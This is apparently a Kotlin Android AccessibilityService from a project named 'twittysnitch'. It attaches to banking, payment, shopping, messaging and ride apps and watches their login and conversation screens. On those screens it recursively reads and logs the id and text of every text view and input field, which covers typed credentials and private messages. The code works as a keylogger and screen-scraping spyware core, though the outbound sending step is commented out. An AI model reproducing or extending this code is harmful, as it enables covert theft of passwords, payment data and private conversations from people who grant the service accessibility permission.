package com.odbol.twittysnitch

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.ComponentName
import android.content.pm.ActivityInfo
import android.content.pm.PackageManager
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.util.ArrayList

class A11yService : AccessibilityService() {

    private var packages: ArrayList<String>? = null
    private var shouldTrack = false
    override fun onServiceConnected() {
        val info = serviceInfo
        populateActivitesTotrack()
        info.packageNames = arrayOf(
            "com.flipkart.android", "com.myntra.android", "com.whatsapp", "com.facebook.orca",
            "com.msf.kbank.mobile", "bpr10.git.voodosample", "com.facebook.katana", "net.one97" +
                    ".paytm", "com.ubercab", "com.nianticlabs.pokemongo", "com.phonepe.app"
        )
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
        this.serviceInfo = info
    }

    private fun populateActivitesTotrack() {
        packages = ArrayList()
        packages!!.add("net.one97.paytm/.auth.activity.AJRAuthActivity")
        packages!!.add("com.flipkart.android/.activity.MLoginActivity")
        packages!!.add("com.whatsapp/.Conversation")
        packages!!.add("com.facebook.orca/com.facebook.messenger.neue.MainActivity")
        packages!!.add("bpr10.git.voodosample/bpr10.git.voodosample1.MainActivity")
        packages!!.add("com.phonepe.app/.ui.activity.Navigator_MainActivity")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        var shouldToast = true
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val componentName = ComponentName(
                event.packageName.toString(),
                event.className.toString()
            )
            shouldToast = false
            val activityInfo = tryGetActivity(componentName)
            val isActivity = activityInfo != null
            if (isActivity) {
                shouldTrack = isActivityToBeTracked(componentName.flattenToShortString())
            }
        }
        if (!shouldTrack) {
            return
        }
        val eventType = event.eventType
        var eventText: String? = null
        when (eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                eventText = " Text Changed "
            }
        }
        eventText = eventText + " CD: " + event.contentDescription + " "
        val source = event.source ?: return
        printAllText(source, shouldToast)
    }

    private fun isActivityToBeTracked(activityInfo: String): Boolean {
        return packages!!.contains(activityInfo)
    }

    private fun tryGetActivity(componentName: ComponentName): ActivityInfo? {
        return try {
            packageManager.getActivityInfo(componentName, 0)
        } catch (e: PackageManager.NameNotFoundException) {
            null
        }
    }

    private fun printAllText(source: AccessibilityNodeInfo?, shouldToast: Boolean) {
        if (source == null) {
            return
        }
        if ("android.widget.TextView" == source.className || ("android.widget.EditText"
                    == source.className)
        ) {
            var id = source.viewIdResourceName
            if (id != null) {
                id = id.split("/").toTypedArray()[1]
            }
            val eventData = "id: " + id + ", text:" + source.text
            Log.d(LOG_TAG, eventData)
//            BusProvider.UI_BUS.post(TextChangeEvent(eventData, shouldToast))
        }
        for (i in 0 until source.childCount) {
            val child = source.getChild(i)
            if (child != null) {
                printAllText(child, shouldToast)
                child.recycle()
            }
        }
    }

    override fun onInterrupt() {}

    companion object {
        private const val LOG_TAG = "A11yService"
    }
}
